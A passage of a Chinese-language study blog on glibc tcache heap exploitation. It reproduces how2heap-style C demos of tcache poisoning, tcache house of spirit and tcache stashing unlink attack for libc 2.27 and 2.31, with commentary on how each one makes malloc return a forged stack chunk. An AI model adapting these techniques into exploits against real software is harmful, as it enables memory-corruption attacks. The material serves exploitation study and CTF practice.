class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是<code>fake_chunks</code>，可以看到伪造了个<code>size</code>：</p><img src="/2021/10/05/tache-bin-attack/7.png" class=""><p><code>free</code>之后就能看到<code>tache</code>里面有这个堆块了，再申请出来就得到了此块地址的控制器：</p><img src="/2021/10/05/tache-bin-attack/8.png" class=""><h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>这个攻击手法就稍微精巧一点，没有之前的这么简单粗暴，我们一步步来看！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//查看地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>stack_var[3]</code>放<code>&amp;stack_var[2]</code>的原因是为了绕过<code>unlink</code>的检查，<code>bck-&gt;fd = bin;</code>和<code>bin-&gt;bk = bck;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>申请了<code>9</code>个<code>0x90</code>大小的堆块，并把他们都放进了<code>chunk_lis</code>这个数组里面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再<code>free</code>掉<code>6</code>个堆块，再<code>free</code>掉一个之后<code>tache</code>就满了，再往下<code>free</code>的堆块就将进到<code>unsorted bin</code>里面，<code>chunk_lis[0]</code>和<code>chunk_lis[0]</code>为什么要隔开呢？是怕它俩合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//last tcache bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/9.png" class=""><p>之后分配一个<code>0xa0</code>大小的堆块，它会先到<code>tache bin</code>里面寻找，发现并没有这个大小的堆块，又到<code>unsorted bin</code>里面找，还是没找到，没找到归没找到，它还是会把<code>unsorted bin</code>里面的堆块整理到对应大小的<code>bin</code>中，所以<code>chunk_lis[0]</code>和<code>chunk_lis[2]</code>会进到<code>small bin</code>，由于在<code>bin</code>中没有这个大小的堆块，所以它直接调用<code>brk</code>来创建堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/10.png" class=""><p>此时<code>malloc 0x90</code>就是直接从<code>tache</code>里面拿，为什么要这样做呢？是为了给<code>chunk_lis[0]</code>和<code>chunk_lis[2]</code>留出位置，等会就能看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>之后把<code>chunk3</code>也就是<code>0x603390</code>这个堆块的<code>bk</code>修改成<code>stack_var</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/11.png" class=""><p><code>calloc</code>有个特点，就是不会去<code>tache</code>里面拿堆块，不去拿就算了，还要把对应大小的堆块放进<code>tache</code>里面，这就正好了呀！这直接就把<code>stack_var</code>放进<code>tache</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/12.png" class="" width="12"><p>由于第一个堆块就是<code>stack_var</code>，直接<code>malloc</code>就能得到栈上的控制权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="built_in">malloc</span>(<span class="number">0x90</span>); </span><br></pre></td></tr></table></figure><p><code>gyctf_2020_signin</code>这题差不多就是按照<code>tcache_stashing_unlink_attack</code>改编而成的，感兴趣可以去看看《buu刷题记之PWN系列》，<code>calloc</code>的细节也有提到…</p><h3 id="libc-2-31-so"><a href="#libc-2-31-so" class="headerlink" title="libc-2.31.so"></a>libc-2.31.so</h3><h4 id="tcache-poisoning-1"><a href="#tcache-poisoning-1" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h4><p>和<code>libc-2.27.so</code>一样的，不多说了….</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-house-of-spirit-1"><a href="#tcache-house-of-spirit-1" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>死性不改呀！😂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>写了个寂寞….</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 